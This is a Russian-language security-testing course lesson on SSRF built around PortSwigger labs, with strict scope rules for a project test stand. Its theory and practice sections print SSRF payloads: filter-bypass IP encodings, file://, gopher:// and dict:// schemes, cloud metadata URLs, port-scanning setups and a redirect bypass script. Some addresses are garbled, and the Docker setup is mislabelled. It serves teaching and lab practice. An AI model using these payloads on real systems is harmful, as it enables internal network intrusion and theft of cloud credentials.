# Занятие 26. SSRF: Server-Side Request Forgery, лабы PortSwigger

## Учебная рамка

**Входные требования:** Базовое понимание HTTP, форм, параметров URL и работы браузера/DevTools.

**Результат занятия:** Студент воспроизводит уязвимость только в учебном приложении и объясняет условие ее возникновения и способ защиты.

**Наследуемая SDET-компетенция:** test design, negative testing, API/UI evidence и перевод OWASP-риска в проверяемый QA-кейс.

**Security QA-компетенция:** моделирование web-рисков OWASP и безопасная ручная проверка Slider AI.

**Связь с книгами:** OWASP/WSTG как основной security reference; «PyCharm. Профессиональная работа на Python 2024» — DevTools/HTTP Client/evidence workflow.

**Основной источник:** «PyCharm. Профессиональная работа на Python 2024» и `Black Hat Python` только для lab-only/defensive interpretation.

**Дополнительные источники:** «Легкий способ выучить Python 3 еще глубже» для обработки запросов, текстов и простых проверочных данных.

**Что берем из источника:** разделение lab payload и product-safe marker, HTTP evidence, перевод риска OWASP в security test case.

**Как это превращается в SDET/Security QA навык:** проектировать безопасные проверки Slider AI через OWASP/WSTG без destructive payloads.

**Что нельзя переносить на Slider AI без отдельного разрешения:** учебные payloads выполнять только в DVWA/WebGoat/PortSwigger; на Slider AI использовать безопасные маркеры и passive evidence.


**Процессный артефакт:** `THREAT_MODEL.md` или `SECURITY_FINDING_TEMPLATE.md`: abuse case, evidence и expected control.

**Безопасная цель:** DVWA, WebGoat, bWAPP, PortSwigger Web Security Academy или локальная учебная VM. Запрещены реальные сайты без письменного разрешения.

**Среда выполнения:** Основной путь — macOS native, браузер, DevTools, Homebrew и Python. Kali Linux ARM64 VM, UTM или cloud lab используются только если это явно требуется задачей или вынесено в углубление.

**Обязательный путь новичка:** Пройти демонстрационный сценарий на низком уровне сложности, сделать скриншот/лог запроса и описать причину уязвимости.

**Углубление:** Повторить на более высоком уровне сложности, сравнить поведение фильтров и предложить безопасную реализацию.

**Минимальная проверка успеха:** Уязвимость подтверждена в учебной среде, payload не направлялся на реальные сервисы, студент может назвать защитную меру.

**Эталонный вывод:** Отчет содержит URL учебной лаборатории, введенный payload, фрагмент ответа и объяснение риска простыми словами.

**Критерии сдачи:** Зачет: подтверждена учебная уязвимость и описана защита. Отлично: добавлен разбор, почему payload работает или перестает работать.

## Reading pack из книг курса

Этот раздел не является заданием “пойди и найди теорию в книгах”. Книги использованы автором курса для подготовки лекции `Занятие 26. SSRF: Server-Side Request Forgery, лабы PortSwigger`, а студент получает самодостаточное объяснение в разделах `Source-driven theory` и `Теория`.

- `docs/socraticode/pycharm-professional-python-2024-pages/`
- `docs/socraticode/black-hat-python-ru-pages/` только lab-only/defensive

Конкретные страницы для этого блока: `pycharm-professional-python-2024-pages/page-338.md`-`page-369.md`; `black-hat-python-ru-pages/page-120.md`-`page-140.md` только lab-only.

Что обязана объяснить лекция на основе этих книг:

1. Термины и команды, которые прямо поддерживают тему урока.
2. Инженерный принцип, который переносится из SDET в Security QA.
3. Ограничение безопасности: что нельзя делать на Slider AI без approval.
4. Пример, который превращается в evidence, helper, checklist или process artifact.

Если книга описывает опасную технику, она переносится только в lab-only или defensive interpretation. Студент не должен обращаться к книгам, чтобы понять базовую теорию текущего урока.

## Source-driven theory

Этот урок опирается на книжные источники курса как на базу, а не как на факультативное чтение. Из источников берется практическая дисциплина: разделение lab payload и product-safe marker, HTTP evidence, перевод риска OWASP в security test case. Для SDET это важно потому, что security-проверка должна быть воспроизводимой, объяснимой и пригодной для отчета, а не превращаться в набор разрозненных команд.

Книжный материал в уроке используется в трех шагах:

1. Понять термин или технику на безопасном примере.
2. Перевести идею в QA-действие: test case, observation, evidence, helper или process artifact.
3. Отделить разрешенную практику от действий, которые требуют отдельного approval.

Граница для Slider AI: учебные payloads выполнять только в DVWA/WebGoat/PortSwigger; на Slider AI использовать безопасные маркеры и passive evidence. Если нужная техника выходит за эту границу, результат урока оформляется как `requires approval`, lab-only practice или defensive recommendation.

## Теория

**SSRF (Server-Side Request Forgery)** — уязвимость, при которой атакующий заставляет сервер выполнить HTTP-запрос по указанному адресу. Сервер становится прокси для атакующего.

### Механизм работы

1. Веб-приложение принимает URL от пользователя (например, для загрузки аватара, проверки ссылки)
2. Сервер выполняет запрос к этому URL
3. Атакующий подставляет адрес внутреннего сервиса (например, `http://192.168.0.x80/admin`)
4. Сервер выполняет запрос и возвращает ответ атакующему

### Что можно сделать через SSRF

- Сканировать внутреннюю сеть (port scanning)
- Доступ к внутренним сервисам (Redis, Elasticsearch, Admin панели)
- Обход аутентификации (запрос от имени сервера)
- Чтение файлов (`file:///etc/passwd` через URL-схемы)
- Атака на облачные метаданные (AWS, GCP)

### Категории SSRF

1. **Basic SSRF**: Ответ от внутреннего сервиса возвращается пользователю
2. **Blind SSRF**: Ответ не виден, но запрос выполняется (используется для сканирования или атак через DNS/HTTP callbacks)

### Обход фильтров

| Фильтр | Обход |
|--------|-------|
| Блокирует `127.0.0.1` | Используйте `localhost`, `0.0.0.0`, `0177.0.0.1` (восьмеричная) |
| Блокирует `localhost` | `spoofed.burpcollaborator.net` или `2130706433` (десятичная) |
| Проверяет HTTP/HTTPS | Используйте `file://`, `dict://`, `gopher://` |
| Блокирует URL | Используйте URL encoding: `%6c%6f%63%61%6c%68%6f%73%74` |

---

## Guided practice

1. Сформулируйте риск урока как abuse case и как проверяемое ожидание защиты.
2. Отработайте опасную технику только в lab, если урок этого требует.
3. Для Slider AI выполните safe-marker или passive observation без извлечения данных и без destructive payload.
4. Классифицируйте результат: `finding`, `observation`, `not reproducible`, `not applicable` или `requires approval`.

### Эталон самостоятельной работы

К концу guided practice у студента есть короткий Markdown-артефакт: цель проверки, выполненные шаги, sanitized evidence, интерпретация результата, границы применимости и следующий безопасный шаг.

## Практическое занятие

### Лаборатории PortSwigger

PortSwigger (создатели Burp Suite) предоставляют бесплатные лабы по SSRF.

1. Зарегистрируйтесь на https://portswigger.net/web-security/ssrf
2. Перейдите в **Server-side request forgery (SSRF)**
3. Выполните лабу **SSRF with filter bypass via open redirection**

### Практика: Базовый SSRF

**Шаг 1: Поиск функционала, принимающего URL**
Ищите функции:
- Загрузка аватара по URL
- Проверка ссылок (URL preview)
- Webhooks
- API, принимающее callback URL

**Шаг 2: Атака на localhost**
```
POST /check-url HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded

url=http://192.168.0.x/admin
```

Если сервер вернул содержимое `/admin` — SSRF сработал.

**Шаг 3: Сканирование портов**
Используйте Burp Intruder для перебора портов:
```
url=http://192.168.0.x:§PORT§
```
Payloads: 22, 80, 443, 6379 (Redis), 9200 (Elasticsearch), 8080

Смотрите на время ответа и содержимое.

**Шаг 4: Использование Burp Collaborator**
1. В Burp откройте **Burp → Collaborator**
2. Нажмите **Copy to clipboard** (получите уникальный domain)
3. Отправьте SSRF запрос: `url=http://ВАШ_DOMAIN.collaborator.net`
4. Нажмите **Poll now** в Collaborator — должен прийти DNS + HTTP запрос

### Практика: Обход фильтров

Если заблокирован `localhost`:
```
url=http://0x7f000001/admin  # hex для 127.0.0.1
url=http://2130706433/admin   # decimal для 127.0.0.1
url=http://127.1/admin        # сокращенный формат
```

### Скриншоты для отчета

1. **Скриншот 1**: PortSwigger лаба решена (зеленая галочка)
2. **Скриншот 2**: Burp Collaborator — получен HTTP/DNS запрос
3. **Скриншот 3**: Сканирование портов — ответы от разных портов

### Примеры вывода

**Burp Collaborator — полученные запросы:**
```
DNS lookup for abc123.oastify.com from 1.2.3.4
HTTP GET http://abc123.oastify.com/ from 1.2.3.4
```

**SSRF — сканирование портов через Intruder:**
```
Payload: http://192.168.0.x:22   → Timeout/Error (SSH)
Payload: http://192.168.0.x   → 200 OK (HTTP)
Payload: http://192.168.0.x:443  → 200 OK (HTTPS)
Payload: http://192.168.0.x:6379 → Response (Redis)
```

**Обход фильтров — использование разных форматов IP:**
```bash
# Все эти адреса указывают на localhost:
http://127.0.0.1/admin
http://0x7f000001/admin        # Hex
http://2130706433/admin        # Decimal
http://0177.0.0.1/admin       # Octal
http://192.168.0.x/admin
```

### Частые ошибки

1. **Забыть про внутренние сервисы** — Redis, Elasticsearch, Admin панели часто не защищены
2. **Игнорировать Blind SSRF** — даже без ответа атака может сработать (DNS callbacks)
3. **Не использовать Burp Collaborator** — для проверки Blind SSRF это критично
4. **Блокировка URL-схем** — иногда `file://`, `gopher://` тоже работают

### Вопросы на понимание

1. Почему SSRF позволяет атаковать внутренние сервисы?
2. В чем разница между обычным и Blind SSRF?
3. Как облачные метаданные (169.254.169.254) связаны с SSRF?
4. Почему `gopher://` опасен при SSRF?

### Адаптация под macOS (M2)

```bash
# Установка PortSwigger лаб на macOS (через Docker, работает на M2)
docker run -d -p 8080:80 -p 8443:443 webscantest/owasp-webgoat-php

# Использование curl для тестирования SSRF локально
curl -s "http://192.168.0.x80/check-url?url=http://169.254.169.254/latest/meta-data/"

# Python сервер для имитации внутреннего сервиса
cat > /tmp/internal_service.py << 'EOF'
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Internal Admin Panel - Access Granted")
        
print("Internal service on 0.0.0.0:8888")
HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()
EOF
python3 /tmp/internal_service.py &
```

---


## Адаптация под macOS (M2, 8GB)

- Для macOS native используйте Homebrew или официальный installer: `brew install <tool>`; для явно помеченной Kali/Linux-среды допустим `apt`.
- Kali/Linux VM запускайте только как углубление и выделяйте не более 3-4GB RAM на MacBook Air M2 (8GB)
- Если нужна Kali/Linux VM на Apple Silicon, используйте ARM64-образ в UTM/VMware Fusion/Parallels; не используйте x86/x64 VM как базовый путь.
- Docker работает нативно на M2: `docker pull <image>`
- Для VPN используйте Tunnelblick (OpenVPN) или официальные клиенты
- Для Python используйте `pip3 install` вместо `pip install`


## Задачи для самостоятельного выполнения

1. **Лабы PortSwigger**: Решите минимум 2 лабы по SSRF на https://portswigger.net/web-security/ssrf. Сделайте скриншот каждой решенной лабы (с зеленой галочкой).

2. **SSRF через URL-схемы**: Попробуйте использовать схемы, отличные от http://:
   - `file:///etc/passwd`
   - `dict://localhost:11211/` (memcached)
   - `gopher://localhost:25/` (SMTP)
   
   Опишите, какие схемы заблокированы, какие работают.

3. **Обход через redirect**: Научитесь обходить фильтры через redirect. Создайте простой скрипт `redirect.php`:
   ```php
   <?php header("Location: http://192.168.0.x/admin"); ?>
   ```
   Используйте: `url=http://yourserver.com/redirect.php`. Сработал ли обход?

4. **Blind SSRF с Collaborator**: В Burp Suite откройте Collaborator, получите уникальный domain. Используйте его в SSRF-пейлоаде. Покажите в отчете: пришел ли DNS-запрос в Collaborator, пришел ли HTTP-запрос.

5. **Cloud SSRF**: Изучите уязвимость SSRF к метаданным облаков. Попробуйте (на лабах) запросить:
   - AWS: `http://169.254.169.254/latest/meta-data/`
   - GCP: `http://metadata.google.internal/computeMetadata/v1/`
   
   Опишите, какая информация может утечь через эти эндпоинты.

## Практика на Slider AI

**Цель стенда:** `https://olddev.slider-ai.ru`

**Контекст разрешения:** тестовый стенд проекта Slider AI, доступен QA для обучения и проверки безопасности. Production и любые другие домены не входят в это задание.

**Ограничения безопасности:** соблюдать `education/slider_ai_scope.md`; не выполнять DoS/load-тесты, brute force, destructive payloads, изменение чужих данных, извлечение секретов и действия вне согласованного scope.

**Уровень прогрессии:** SSRF

### Минимум

Найдите функции, где пользователь задает URL: импорт, preview, webhook, fetch, integration.

### Практика Slider AI

Проверьте только allowlist/validation сообщением с явно некорректным публичным URL, без обращения к внутренним адресам.

### Углубление после изучения следующих уроков

После отдельного разрешения подготовьте SSRF test plan с запрещенными диапазонами и safe callback.

### Артефакт сдачи

Markdown-запись по шаблону из `education/slider_ai_scope.md`: урок, компонент Slider AI, шаги, фактический результат, доказательства без секретов, риск, рекомендация и статус.

### Критерий готовности

Задание выполнено только на `olddev.slider-ai.ru`, не выходит за scope, содержит проверяемый артефакт и явно отмечает `finding`, `informational`, `not reproducible`, `not applicable` или `requires approval`.

## Rubric

| Уровень | Что должно быть сдано |
|---|---|
| Зачет | Выполнен обязательный путь новичка, есть sanitized evidence, действия не выходят за scope |
| Хорошо | Есть объяснение риска или процесса, аккуратные шаги воспроизведения и корректный статус результата |
| Отлично | Результат связан с `OWASP Test Design for Slider AI`, remediation/retest или automation appendix |

## Self-check

1. Какая SDET-компетенция используется в уроке?
2. Какая часть объяснения опирается на книги курса?
3. Где проходит безопасная граница для Slider AI?
4. Какой артефакт можно показать команде без раскрытия секретов?
5. Что нужно вынести в углубление, lab-only или отдельный approval?
